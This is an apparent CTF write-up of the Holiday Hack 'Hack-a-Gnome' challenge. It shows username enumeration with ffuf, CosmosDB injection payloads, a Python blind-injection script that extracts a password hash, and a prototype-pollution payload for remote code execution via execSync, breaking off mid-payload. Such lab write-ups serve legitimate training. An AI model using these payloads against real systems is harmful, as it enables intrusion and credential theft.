  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 3
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 3
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Hack-a-Gnome
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Hack-a-Gnome
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    <span class="md-ellipsis">
      
        Objective
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hints
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solution
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#login" class="md-nav__link">
    <span class="md-ellipsis">
      
        Login
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Login">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#username-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Username Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Injection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#prototype-pollution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Prototype Pollution
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#can-bus" class="md-nav__link">
    <span class="md-ellipsis">
      
        CAN Bus
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#maze" class="md-nav__link">
    <span class="md-ellipsis">
      
        Maze
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#response" class="md-nav__link">
    <span class="md-ellipsis">
      
        Response
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    <span class="md-ellipsis">
      
        Objective
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hints
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solution
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#login" class="md-nav__link">
    <span class="md-ellipsis">
      
        Login
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Login">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#username-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Username Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Injection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#prototype-pollution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Prototype Pollution
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#can-bus" class="md-nav__link">
    <span class="md-ellipsis">
      
        CAN Bus
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#maze" class="md-nav__link">
    <span class="md-ellipsis">
      
        Maze
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#response" class="md-nav__link">
    <span class="md-ellipsis">
      
        Response
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="Navigation">
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../.." class="md-path__link">
        
  <span class="md-ellipsis">
    Welcome
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      <li class="md-path__item">
        <a href="./" class="md-path__link">
          
  <span class="md-ellipsis">
    Act 3
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="hack-a-gnome">Hack-a-Gnome<a class="headerlink" href="#hack-a-gnome" title="Permanent link">¶</a></h1>
<p>Difficulty: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.62L12 2 9.19 8.62 2 9.24l5.45 4.73L5.82 21z"></path></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.62L12 2 9.19 8.62 2 9.24l5.45 4.73L5.82 21z"></path></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.62L12 2 9.19 8.62 2 9.24l5.45 4.73L5.82 21z"></path></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 15.39-3.76 2.27.99-4.28-3.32-2.88 4.38-.37L12 6.09l1.71 4.04 4.38.37-3.32 2.88.99 4.28M22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.45 4.73L5.82 21 12 17.27 18.18 21l-1.64-7.03z"></path></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 15.39-3.76 2.27.99-4.28-3.32-2.88 4.38-.37L12 6.09l1.71 4.04 4.38.37-3.32 2.88.99 4.28M22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.45 4.73L5.82 21 12 17.27 18.18 21l-1.64-7.03z"></path></svg></span></p>
<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">¶</a></h2>
<div class="admonition question">
<p class="admonition-title">Task description</p>
<p>Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun.</p>
</div>
<details class="quote">
<summary>Chris Davis</summary>
<p>Hi, my name is Chris.</p>
<p>I like miniature war gaming and painting minis.</p>
<p>I enjoy open source projects and amateur robotics.</p>
<p>Hiking and kayaking are my favorite IRL activies.</p>
<p>I love single player video games with great stoylines.</p>
<p>Hey, I could really use another set of eyes on this gnome takeover situation.</p>
<p>Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!</p>
<p>But every system has weaknesses if you know where to look.</p>
<p>If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.</p>
<p>Ready to help me turn one of these rebellious bots against its own kind?</p>
</details>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">¶</a></h2>
<details class="tip">
<summary>Hack-A-Gnome</summary>
<p>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</p>
</details>
<details class="tip">
<summary>Hack-A-Gnome</summary>
<p>Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</p>
</details>
<details class="tip">
<summary>Hack-A-Gnome</summary>
<p>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</p>
</details>
<details class="tip">
<summary>Hack-A-Gnome</summary>
<p>I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).</p>
</details>
<details class="tip">
<summary>Hack-A-Gnome</summary>
<p>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</p>
</details>
<details class="tip">
<summary>Hack-A-Gnome</summary>
<p>Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the <code>canbus_client.py</code> file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">¶</a></h2>
<p>There are multiple stages we need to go through to solve this challenge.</p>
<h3 id="login">Login<a class="headerlink" href="#login" title="Permanent link">¶</a></h3>
<p>We get a login prompt when going to the webpage.</p>
<figure>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../media/hack_a_gnome/hack_a_gnome_1" data-desc-position="bottom"><img alt="answer" src="../../media/hack_a_gnome/hack_a_gnome_1"></a></p>
<figcaption>
<p>Login prompt.</p>
</figcaption>
</figure>
<h4 id="username-enumeration">Username Enumeration<a class="headerlink" href="#username-enumeration" title="Permanent link">¶</a></h4>
<p>The <code>Create Account</code> page allows us to enumerate usernames as it instantly provides feedback on whether a username is still available. We can query common English names:</p>
<div class="language-text highlight"><span class="filename">Enumerate usernames using ffuf</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ffuf -w ./malenames-usa-top1000.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -fs 18
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>HAROLD                  [Status: 200, Size: 19, Words: 1, Lines: 1]
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>BRUCE                   [Status: 200, Size: 19, Words: 1, Lines: 1]
</span></code></pre></div>
<p>We now know that two accounts exist with <code>HAROLD</code> and <code>BRUCE</code> as username.</p>
<h4 id="sql-injection">SQL Injection<a class="headerlink" href="#sql-injection" title="Permanent link">¶</a></h4>
<p>Putting a <code>"</code> in the username field on the <code>Create Account</code> page generates an error:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Error: An error occurred while checking username: Message: {"errors":[{"severity":"Error","location":{"start":44,"end":45},"code":"SC1012","message":"Syntax error, invalid string literal token '\"'."}]} ActivityId: 27cab604-4a72-4736-9d48-3ebaa577a5a4, Microsoft.Azure.Documents.Common/2.14.0
</span></code></pre></div>
<p>We learn that the backend appears to be using Azure DocumentDB/CosmosDB and that it is injectable.</p>
<p>We can leverage the <a href="https://learn.microsoft.com/en-us/cosmos-db/query/is-defined">IS_DEFINED()</a> function of Microsoft CosmosDB to find the password hash of a user object in the database. CosmosDB queries frequently use <code>c</code> as document alias and have <code>id</code> as a key. We can test this as follows using <code>IS_DEFINED()</code>:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># Try 'id' as key
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>" OR IS_DEFINED(c.id) --
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a># Try 'digest' as key
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>" OR IS_DEFINED(c.digest) --
</span></code></pre></div>
<p>This returns <code>Username is taken</code> for both, which indicates it returned <code>TRUE</code> meaning the alias and keys exist. The <code>digest</code> will contain the password hash we are looking for.</p>
<p>Therefore, the backend query must look something like this:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT IIF(COUNT(1) = 0, true, false) AS available
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>FROM c
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>WHERE c.username = "&lt;username&gt;"
</span></code></pre></div>
<div class="admonition example">
<p class="admonition-title">AI usage</p>
<p>ChatGPT was used to learn more about the SQL query potentially in use in the backend, what alias is typically used when querying values CosmosDB, and what key names could be used to save a password hash.</p>
</div>
<p>We can leverage scripting to brute-force our way to the password by using the function <code>STARTSWITH()</code> and testing different character sequences. This is similar to the trick used in the HHC 2024 challenge <a href="https://tominthebytes.github.io/SANS-HHC-2024/act_3/deactivate/?h=script#injection">Deactivate Frostbit Naughty-Nice List Publication</a>.</p>
<details class="note">
<summary>Python SQL injection script to find password hash</summary>
<p>This script will try all characters until the <code>STARTSWITH()</code> functions returns <code>TRUE</code>. If <code>TRUE</code>, then it saves that character and looks for the next one in the sequence.</p>
<div class="language-py highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-4-10">10</a></span>
<span class="normal"><a href="#__codelineno-4-11">11</a></span>
<span class="normal"><a href="#__codelineno-4-12">12</a></span>
<span class="normal"><a href="#__codelineno-4-13">13</a></span>
<span class="normal"><a href="#__codelineno-4-14">14</a></span>
<span class="normal"><a href="#__codelineno-4-15">15</a></span>
<span class="normal"><a href="#__codelineno-4-16">16</a></span>
<span class="normal"><a href="#__codelineno-4-17">17</a></span>
<span class="normal"><a href="#__codelineno-4-18">18</a></span>
<span class="normal"><a href="#__codelineno-4-19">19</a></span>
<span class="normal"><a href="#__codelineno-4-20">20</a></span>
<span class="normal"><a href="#__codelineno-4-21">21</a></span>
<span class="normal"><a href="#__codelineno-4-22">22</a></span>
<span class="normal"><a href="#__codelineno-4-23">23</a></span>
<span class="normal"><a href="#__codelineno-4-24">24</a></span>
<span class="normal"><a href="#__codelineno-4-25">25</a></span>
<span class="normal"><a href="#__codelineno-4-26">26</a></span>
<span class="normal"><a href="#__codelineno-4-27">27</a></span>
<span class="normal"><a href="#__codelineno-4-28">28</a></span>
<span class="normal"><a href="#__codelineno-4-29">29</a></span>
<span class="normal"><a href="#__codelineno-4-30">30</a></span>
<span class="normal"><a href="#__codelineno-4-31">31</a></span>
<span class="normal"><a href="#__codelineno-4-32">32</a></span>
<span class="normal"><a href="#__codelineno-4-33">33</a></span>
<span class="normal"><a href="#__codelineno-4-34">34</a></span>
<span class="normal"><a href="#__codelineno-4-35">35</a></span>
<span class="normal"><a href="#__codelineno-4-36">36</a></span>
<span class="normal"><a href="#__codelineno-4-37">37</a></span>
<span class="normal"><a href="#__codelineno-4-38">38</a></span>
<span class="normal"><a href="#__codelineno-4-39">39</a></span>
<span class="normal"><a href="#__codelineno-4-40">40</a></span>
<span class="normal"><a href="#__codelineno-4-41">41</a></span>
<span class="normal"><a href="#__codelineno-4-42">42</a></span>
<span class="normal"><a href="#__codelineno-4-43">43</a></span>
<span class="normal"><a href="#__codelineno-4-44">44</a></span>
<span class="normal"><a href="#__codelineno-4-45">45</a></span>
<span class="normal"><a href="#__codelineno-4-46">46</a></span>
<span class="normal"><a href="#__codelineno-4-47">47</a></span>
<span class="normal"><a href="#__codelineno-4-48">48</a></span>
<span class="normal"><a href="#__codelineno-4-49">49</a></span>
<span class="normal"><a href="#__codelineno-4-50">50</a></span>
<span class="normal"><a href="#__codelineno-4-51">51</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c1"># Target endpoint (expects ?value=... or similar)</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="n">base_url</span> <span class="o">=</span> <span class="s2">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="c1"># Characters to iterate over</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">check_value</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>    <span class="c1"># Construct a benign query value for probing</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>    <span class="n">query_value</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">result</span><span class="si">}{</span><span class="n">char</span><span class="si">}</span><span class="s2">"</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">'</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">?username=" OR STARTSWITH(c.digest, "</span><span class="si">{</span><span class="n">query_value</span><span class="si">}</span><span class="s1">") --'</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a>    <span class="c1"># Expect a structure like: { "available": true }</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a>    <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"available"</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a><span class="k">def</span><span class="w"> </span><span class="nf">run_probe</span><span class="p">():</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a>    <span class="n">result</span> <span class="o">=</span> <span class="s2">""</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a>    <span class="n">position</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a>        <span class="n">matched</span> <span class="o">=</span> <span class="kc">None</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a>        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Testing position </span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s2"> with '</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a>            <span class="k">if</span> <span class="ow">not</span><span class="p">(</span><span class="n">check_value</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">result</span><span class="p">)):</span>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a>                <span class="n">matched</span> <span class="o">=</span> <span class="n">char</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a>                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">char</span>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Match at position </span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s2">: '</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35"></a>                <span class="k">break</span>
</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36"></a>
</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37"></a>        <span class="k">if</span> <span class="n">matched</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38"></a>            <span class="k">break</span>
</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39"></a>
</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40"></a>        <span class="n">position</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41"></a>
</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42"></a>        <span class="c1"># External stopping condition to avoid infinite loops</span>
</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43"></a>        <span class="k">if</span> <span class="n">position</span> <span class="o">&gt;</span> <span class="mi">64</span><span class="p">:</span>
</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44"></a>            <span class="k">break</span>
</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45"></a>
</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46"></a>    <span class="k">return</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47"></a>
</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">"Starting boolean‑based probe..."</span><span class="p">)</span>
</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50"></a>    <span class="n">output</span> <span class="o">=</span> <span class="n">run_probe</span><span class="p">()</span>
</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">"Result:"</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span>
</span></code></pre></div></td></tr></tbody></table></div>
</details>
<div class="admonition example">
<p class="admonition-title">AI usage</p>
<p>ChatGPT was used to adapt the injection script used for last year's HHC.</p>
</div>
<details class="success">
<summary>Password</summary>
<p>The Python script will return the MD5 hash <code>d0a9ba00f80cbc56584ef245ffc56b9e</code>. Using <a href="https://crackstation.net/">crackstation.net</a> we can decode this to the password <code>oatmeal12</code>. We test this password with both usernames (<code>BRUCE</code> and <code>HAROLD</code>) and find that it's the password of <code>BRUCE</code>.</p>
<figure>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../media/hack_a_gnome/hack_a_gnome_2" data-desc-position="bottom"><img alt="answer" src="../../media/hack_a_gnome/hack_a_gnome_2"></a></p>
<figcaption>
<p>Decoding password hash.</p>
</figcaption>
</figure>
</details>
<h3 id="prototype-pollution">Prototype Pollution<a class="headerlink" href="#prototype-pollution" title="Permanent link">¶</a></h3>
<p>After login we see the following:</p>
<figure>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../media/hack_a_gnome/hack_a_gnome_3" data-desc-position="bottom"><img alt="answer" src="../../media/hack_a_gnome/hack_a_gnome_3"></a></p>
<figcaption>
<p>Decoding password hash.</p>
</figcaption>
</figure>
<p>The <code>Gnome Statistics</code> window displays values for certain keys and the <code>Gnome Control Interface</code> window displays a robot in some sort of maze. We have movement controls but we get errors when we try to use them. We will need to fix this to move the robot around and get to the control panel in the upper left corner. We also have a button <code>Update Name</code> with which we can push changes to keys in the statistics object.</p>
<p>The hints tell us we need to find a vulnerability that we can exploit using <a href="https://portswigger.net/web-security/prototype-pollution">prototype polution</a>.</p>
<div class="admonition example">
<p class="admonition-title">AI usage</p>
<p>Gemini Pro 3 helped navigating this part of the challenge and provided helpful suggestions.</p>
</div>
<p>We will leverage the <code>Update Name</code> functionality to push values to the prototype JavaScript object. <a href="https://github.com/mde/ejs/issues/451">This</a> GitHub issue inspired the subkey to pollute for RCE:</p>
<div class="language-js highlight"><span class="filename">Prototype pollution</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">{</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="s2">"action"</span><span class="o">:</span><span class="w"> </span><span class="s2">"update"</span><span class="p">,</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="s2">"key"</span><span class="o">:</span><span class="w"> </span><span class="s2">"__proto__"</span><span class="p">,</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="s2">"subkey"</span><span class="o">:</span><span class="w"> </span><span class="s2">"outputFunctionName"</span><span class="p">,</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span><span class="s2">"value"</span><span class="o">:</span><span class="w"> </span><span class="s2">"x;return global.process.mainModule.require('child_process').execSync('ls').toString(); //"</span>
